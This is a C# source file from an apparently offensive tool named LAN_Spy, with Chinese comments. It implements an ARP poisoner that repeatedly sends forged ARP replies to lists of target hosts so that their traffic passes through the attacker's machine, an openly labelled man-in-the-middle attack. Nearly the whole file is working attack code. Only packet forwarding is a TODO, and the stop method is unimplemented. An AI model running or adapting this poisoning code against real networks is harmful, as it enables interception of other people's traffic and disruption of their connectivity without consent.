using PacketDotNet;
using System;
using System.Collections.Generic;
using System.Net;
using System.Threading;
using SharpPcap;

namespace LAN_Spy {
    /// <summary>
    ///     ARP毒化器。
    /// </summary>
    public class Poisoner : BasicClass {
        /// <summary>
        ///     毒化目标。
        /// </summary>
        public List<Host> Target1 = new List<Host>(), Target2 = new List<Host>();

        /// <summary>
        ///     使用设备缓存。
        /// </summary>
        private ICaptureDevice _device;

        /// <summary>
        ///     毒化目标缓存。
        /// </summary>
        private List<Host> _target1, _target2;

        /// <summary>
        ///     毒化线程句柄
        /// </summary>
        private readonly List<Thread> _poisonThreads = new List<Thread>();

        /// <summary>
        ///     根据设定的 <see cref="List{T}"/> 类型的目标列表进行ARP毒化中间人攻击。
        /// </summary>
        /// <exception cref="InvalidOperationException">已有一项毒化工作正在进行。</exception>
        public void StartPoisoning() {
            // 判断是否有未停止的毒化工作
            if (_poisonThreads.Count > 0)
                throw new InvalidOperationException("已有一项毒化工作正在进行。");
            
            // 深复制以缓存目标
            _target1 = new List<Host>();
            _target2 = new List<Host>();
            foreach (var target in Target1)
                _target1.Add(new Host(target.IPAddress, target.PhysicalAddress));
            foreach (var target in Target2)
                _target2.Add(new Host(target.IPAddress, target.PhysicalAddress));

            // 缓存并打开当前设备
            _device = DeviceList[CurDevIndex];
            _device.Open();

            // 开始毒化
            foreach (var target in _target1) {
                Thread poisonThread = new Thread(PoisonThread);
                poisonThread.Start(target);
                _poisonThreads.Add(poisonThread);
            }
            foreach (var target in _target2) {
                Thread poisonThread = new Thread(PoisonThread);
                poisonThread.Start(target);
                _poisonThreads.Add(poisonThread);
            }

            // TODO:增加包转发线程
        }

        /// <summary>
        ///     毒化线程。
        /// </summary>
        /// <param name="obj">毒化的目标。</param>
        private void PoisonThread(object obj) {
            try {
                // 获取目标
                var host = (Host) obj;
                
                // 转存目标
                var targets = _target1.Contains(host) ? _target2.AsReadOnly() : _target1.AsReadOnly();
                
                // 构建包信息
                EthernetPacket ether = new EthernetPacket(_device.MacAddress,
                    host.PhysicalAddress,
                    EthernetPacketType.Arp);
                ARPPacket arp = new ARPPacket(ARPOperation.Response,
                    host.PhysicalAddress,
                    host.IPAddress,
                    _device.MacAddress,
                    new IPAddress(new byte[] {0, 0, 0, 0})) {
                    HardwareAddressType = LinkLayers.Ethernet,
                    ProtocolAddressType = EthernetPacketType.IpV4
                };
                ether.PayloadPacket = arp;
                arp.ParentPacket = ether;
                
                // 强毒化
                for (int i = 0; i < 20; i++) {
                    foreach (var target in targets) {
                        arp.SenderProtocolAddress = target.IPAddress;
                        arp.UpdateCalculatedValues();
                        _device.SendPacket(ether);
                    }
                    Thread.Sleep(500);
                }

                // 弱毒化
                while (true) {
                    foreach (var target in targets) {
                        arp.SenderProtocolAddress = target.IPAddress;
                        arp.UpdateCalculatedValues();
                        _device.SendPacket(ether);
                    }
                    Thread.Sleep(5 * 1000);
                }
            }
            catch (ThreadAbortException) { }
        }


        /// <summary>
        ///     停止ARP毒化中间人攻击。
        /// </summary>
        public void StopPoisoning() {
            // _device.Close();
            throw new NotImplementedException();
        }
    }
}
